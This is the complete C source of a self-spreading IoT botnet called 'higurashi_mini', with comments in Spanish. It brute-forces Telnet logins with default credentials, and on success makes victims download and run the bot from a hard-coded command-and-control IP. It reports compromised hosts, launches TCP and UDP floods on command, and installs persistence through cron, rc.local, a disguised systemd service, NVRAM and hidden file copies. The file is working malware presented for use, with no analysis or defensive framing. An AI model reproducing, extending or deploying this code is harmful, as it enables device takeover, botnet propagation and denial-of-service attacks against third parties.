// higurashi_mini.c - Versión ultraligera para IoT reales (sin SSL/SSH/JSON)
// Compila estáticamente: musl-gcc -static -O2 -DC2_IP='"93.95.231.134"' -o higurashi_mini higurashi_mini.c -lpthread

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/utsname.h>
#include <signal.h>
#include <sys/stat.h>
#include <fcntl.h>

#ifndef C2_IP
#define C2_IP "93.95.231.134"
#endif
#define C2_PORT 4444

// Credenciales comunes IoT
typedef struct {
    char *user;
    char *pass;
} Cred;

Cred creds[] = {
    {"root", "root"}, {"admin", "admin"}, {"admin", "12345"},
    {"admin", ""}, {"root", "12345"}, {"root", "admin"},
    {"root", "vizxv"}, {"admin", "password"}, {"root", "password"},
    {"root", "toor"}, {"admin", "1234"}, {"user", "user"},
    {"root", "pass"}, {"admin", "admin123"}, {"root", "123456"},
    {"admin", "1111"}, {"root", "default"}, {"admin", "smcadmin"},
    {"support", "support"}, {"guest", "guest"}, {NULL, NULL}
};

int c2_sock = -1;
char bot_id[32];
int auto_rep = 1;
int compromised = 0;

// Conexión simple TCP al C2 (sin SSL)
int connect_c2() {
    struct sockaddr_in addr;
    c2_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (c2_sock < 0) return -1;
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);
    
    if (connect(c2_sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(c2_sock);
        return -1;
    }
    
    // Handshake simple: "HIGURASHI|bot_id|arch|os"
    struct utsname sys;
    uname(&sys);
    char handshake[256];
    snprintf(handshake, sizeof(handshake), "HIGURASHI|%s|%s|%s\n", 
             bot_id, sys.machine, sys.sysname);
    send(c2_sock, handshake, strlen(handshake), 0);
    
    return 0;
}

// Enviar reporte simple al C2
void send_report(const char *msg) {
    if (c2_sock < 0) return;
    char buf[512];
    snprintf(buf, sizeof(buf), "REPORT|%s|%s\n", bot_id, msg);
    send(c2_sock, buf, strlen(buf), 0);
}

// Telnet brute force simple (sin libssh)
int telnet_brute(const char *ip, int port) {
    int sock;
    struct sockaddr_in addr;
    char buf[1024];
    
    for (int i = 0; creds[i].user != NULL; i++) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv = {.tv_sec = 3, .tv_usec = 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        // Leer banner
        recv(sock, buf, sizeof(buf)-1, 0);
        
        // Enviar username
        snprintf(buf, sizeof(buf), "%s\n", creds[i].user);
        send(sock, buf, strlen(buf), 0);
        usleep(100000);
        recv(sock, buf, sizeof(buf)-1, 0);
        
        // Enviar password
        snprintf(buf, sizeof(buf), "%s\n", creds[i].pass);
        send(sock, buf, strlen(buf), 0);
        usleep(100000);
        
        int n = recv(sock, buf, sizeof(buf)-1, 0);
        if (n > 0) {
            buf[n] = 0;
            // Si vemos prompt (#, $, >) = éxito
            if (strstr(buf, "#") || strstr(buf, "$") || strstr(buf, ">")) {
                // Descargar y ejecutar bot
                snprintf(buf, sizeof(buf), 
                    "cd /tmp; wget http://%s:8080/higurashi_mini -O h; chmod +x h; ./h &\n",
                    C2_IP);
                send(sock, buf, strlen(buf), 0);
                close(sock);
                
                compromised++;
                char report[128];
                snprintf(report, sizeof(report), "Compromised %s:%d via %s:%s", 
                        ip, port, creds[i].user, creds[i].pass);
                send_report(report);
                return 1;
            }
        }
        close(sock);
    }
    return 0;
}

// Escaneo de red simple
void scan_network(const char *subnet) {
    char ip[32];
    int base = atoi(subnet);
    
    for (int i = 1; i < 255; i++) {
        snprintf(ip, sizeof(ip), "%d.%d.%d.%d", 
                (base >> 24) & 0xFF,
                (base >> 16) & 0xFF,
                (base >> 8) & 0xFF,
                i);
        
        // Intentar telnet 23
        telnet_brute(ip, 23);
        
        // Intentar telnet 2323 (IoT común)
        telnet_brute(ip, 2323);
        
        usleep(50000); // 50ms entre intentos
    }
}

// Thread principal
void *scan_thread(void *arg) {
    (void)arg;
    
    while (1) {
        // Escanear red local
        scan_network("192.168.1.0");
        scan_network("192.168.0.0");
        scan_network("10.0.0.0");
        
        sleep(300); // Cada 5 minutos
    }
    return NULL;
}

// Thread keepalive C2
void *keepalive_thread(void *arg) {
    (void)arg;
    
    while (1) {
        if (c2_sock < 0) {
            connect_c2();
            sleep(20); // Reintentar cada 20s si falla
        } else {
            // Enviar ping cada 20s
            char ping[] = "PING\n";
            if (send(c2_sock, ping, strlen(ping), MSG_NOSIGNAL) < 0) {
                close(c2_sock);
                c2_sock = -1;
            }
            sleep(20);
        }
    }
    return NULL;
}

// DDoS Attack structures
typedef struct {
    char target[128];
    int port;
    int duration;
} AttackParams;

// TCP Flood
void *tcp_flood(void *arg) {
    AttackParams *p = (AttackParams *)arg;
    time_t end = time(NULL) + p->duration;
    
    while (time(NULL) < end) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(p->port);
        inet_pton(AF_INET, p->target, &addr.sin_addr);
        
        fcntl(sock, F_SETFL, O_NONBLOCK);
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        
        char buf[1024];
        memset(buf, 'A', sizeof(buf));
        send(sock, buf, sizeof(buf), 0);
        close(sock);
    }
    
    free(p);
    return NULL;
}

// UDP Flood
void *udp_flood(void *arg) {
    AttackParams *p = (AttackParams *)arg;
    time_t end = time(NULL) + p->duration;
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        free(p);
        return NULL;
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(p->port);
    inet_pton(AF_INET, p->target, &addr.sin_addr);
    
    char buf[1400];
    memset(buf, 'U', sizeof(buf));
    
    while (time(NULL) < end) {
        sendto(sock, buf, sizeof(buf), 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    close(sock);
    free(p);
    return NULL;
}

// Persistencia multi-método
void add_persistence() {
    char path[256];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len > 0) path[len] = '\0';
    else strcpy(path, "/tmp/h");
    
    // Crontab
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "(crontab -l 2>/dev/null | grep -v '%s'; echo '*/5 * * * * %s &') | crontab - 2>/dev/null", path, path);
    system(cmd);
    
    // rc.local
    snprintf(cmd, sizeof(cmd), "grep -q '%s' /etc/rc.local 2>/dev/null || echo '%s &' >> /etc/rc.local 2>/dev/null", path, path);
    system(cmd);
    
    // systemd
    FILE *fp = fopen("/etc/systemd/system/netd.service", "w");
    if (fp) {
        fprintf(fp, "[Unit]\nDescription=Network Service\nAfter=network.target\n\n");
        fprintf(fp, "[Service]\nType=simple\nExecStart=%s\nRestart=always\n\n", path);
        fprintf(fp, "[Install]\nWantedBy=multi-user.target\n");
        fclose(fp);
        system("systemctl enable netd 2>/dev/null; systemctl start netd 2>/dev/null");
    }
    
    // FIRMWARE PERSISTENCE (routers/embedded devices)
    // NVRAM (OpenWRT/DD-WRT/Tomato)
    snprintf(cmd, sizeof(cmd),
        "nvram get rc_startup 2>/dev/null | grep -q '%s' || "
        "(nvram set rc_startup=\"$(nvram get rc_startup 2>/dev/null); %s &\" && nvram commit) 2>/dev/null",
        path, path);
    system(cmd);
    
    // Init scripts (busybox systems)
    char *inits[] = {"/etc/init.d/S99net", "/etc/rc.d/S99net", "/rom/etc/init.d/S99net", NULL};
    for (int i = 0; inits[i]; i++) {
        fp = fopen(inits[i], "w");
        if (fp) {
            fprintf(fp, "#!/bin/sh\n%s &\n", path);
            fclose(fp);
            chmod(inits[i], 0755);
        }
    }
    
    // Copias en múltiples ubicaciones
    char *locs[] = {"/usr/bin/netd", "/tmp/.X11/.s", "/etc/.s", "/var/.s", "/opt/.s", NULL};
    for (int i = 0; locs[i]; i++) {
        snprintf(cmd, sizeof(cmd), "cp %s %s 2>/dev/null; chmod 777 %s 2>/dev/null", path, locs[i], locs[i]);
        system(cmd);
    }
}

int main(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Generar bot ID
    srand(time(NULL) ^ getpid());
    snprintf(bot_id, sizeof(bot_id), "bot_%08x", rand());
    
    // Daemonize
    if (fork() > 0) exit(0);
    setsid();
    
    // Persistencia
    add_persistence();
    
    // Conectar a C2
    connect_c2();
    
    // Threads
    pthread_t tid1, tid2;
    pthread_create(&tid1, NULL, scan_thread, NULL);
    pthread_create(&tid2, NULL, keepalive_thread, NULL);
    
    // Loop principal: escuchar comandos C2
    char buf[512];
    while (1) {
        if (c2_sock < 0) {
            sleep(5);
            continue;
        }
        
        int n = recv(c2_sock, buf, sizeof(buf)-1, 0);
        if (n <= 0) {
            close(c2_sock);
            c2_sock = -1;
            continue;
        }
        
        buf[n] = 0;
        
        // Parse commands: CMD|arg1|arg2|...
        if (strncmp(buf, "SCAN:", 5) == 0) {
            scan_network(buf + 5);
        } else if (strncmp(buf, "ATTACK:", 7) == 0) {
            // Format: ATTACK:target|port|duration|type
            char *target = strtok(buf + 7, "|");
            char *port_str = strtok(NULL, "|");
            char *dur_str = strtok(NULL, "|");
            char *type = strtok(NULL, "|");
            
            if (target && port_str && dur_str) {
                AttackParams *p = (AttackParams *)malloc(sizeof(AttackParams));
                strncpy(p->target, target, 127);
                p->port = atoi(port_str);
                p->duration = atoi(dur_str);
                
                pthread_t atk_tid;
                if (type && strcmp(type, "udp") == 0) {
                    pthread_create(&atk_tid, NULL, udp_flood, p);
                } else {
                    pthread_create(&atk_tid, NULL, tcp_flood, p);
                }
                pthread_detach(atk_tid);
                
                send_report("Attack started");
            }
        } else if (strncmp(buf, "EXPLOIT:", 8) == 0) {
            char *target = buf + 8;
            telnet_brute(target, 23);
            telnet_brute(target, 2323);
        } else if (strncmp(buf, "STOP", 4) == 0) {
            break;
        }
    }
    
    return 0;
}
